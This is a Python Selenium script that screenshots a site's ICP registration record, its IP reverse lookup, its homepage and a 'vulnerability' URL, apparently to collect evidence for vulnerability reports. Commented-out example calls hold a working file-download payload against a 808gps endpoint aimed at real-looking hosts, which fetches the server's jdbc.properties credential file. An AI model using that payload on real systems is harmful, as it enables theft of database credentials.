from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
from PIL import ImageGrab
import os

BASE_DIR1 = os.path.dirname(os.path.abspath(__file__))
BASE_DIR2 = os.path.dirname(BASE_DIR1)


def shoot_noip(url):
    bbox = (0, 0, 1920, 1080)
    options = webdriver.EdgeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--user-data-dir=C:\\Users\\hushuang1\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default')
    driver = webdriver.Edge(options=options)
    # driver.get(r'https://www.baidu.com/')
    driver.maximize_window()

    result = urlparse(url)
    # **********截图icp备案**********
    try:
        url1 = "https://icp.chinaz.com/" + result.netloc
        driver.get(url1)
    except Exception as e:
        driver.quit()
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'icp.png'))

    # **********截图主页**********
    try:
        url2 = result.scheme + "://" + result.netloc
        driver.get(url2)
    except Exception as e:
        driver.quit()
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'site.png'))

    # **********截图漏洞**********
    try:
        url3 = url
        driver.get(url3)
    except Exception as e:
        driver.quit()
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'vul.png'))

    sleep(2)
    driver.quit()


# shoot_noip("https://www.mingshang.cc:443/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties")

def shoot_isip(url, domain):
    bbox = (0, 0, 1920, 1080)
    options = webdriver.EdgeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--user-data-dir=C:\\Users\\hushuang1\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default')
    driver = webdriver.Edge(options=options)
    # driver.get(r'https://www.baidu.com/')
    driver.maximize_window()

    # **********截图icp备案**********
    if url.startswith("http"):
        domain = domain
    else:
        domain = f"http://{domain}"
    try:
        result = urlparse(domain)
        # print(result)
        driver.get("https://icp.chinaz.com/" + result.netloc + result.path)
    except Exception as e:
        driver.quit()
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'icp.png'))
    result = urlparse(url)
    # print(result)

    # **********截图ip反查**********
    try:
        url1 = result.netloc
        url1 = url1.split(":")[0]
        driver.get("https://site.ip138.com/" + url1)
    except Exception as e:
        sleep(3)
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'domain.png'))

    # **********截图主页**********
    try:
        # print(result)
        url2 = result.scheme + "://" + result.netloc
        driver.get(url2)
    except Exception as e:
        driver.quit()
        # print(f"{e}site")
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'site.png'))

    # **********截图漏洞**********
    try:
        url3 = url
        driver.get(url3)
    except Exception as e:
        driver.quit()
        return "shibai"
    sleep(3)
    im = ImageGrab.grab(bbox)
    im.save(os.path.join(BASE_DIR2, 'temp', 'vul.png'))

    sleep(2)
    driver.quit()
    driver.close()

# shoot_isip("http://1.14.8.252:8088/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties", "xjrjyy.cn")
